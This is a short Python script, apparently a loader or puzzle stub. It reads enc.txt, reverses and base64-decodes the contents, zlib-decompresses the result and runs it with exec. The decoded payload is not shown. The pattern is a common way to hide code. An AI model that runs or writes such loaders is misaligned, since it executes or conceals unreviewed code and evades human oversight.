enc = open('enc.txt').read()
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
exec((_)(enc.encode()))
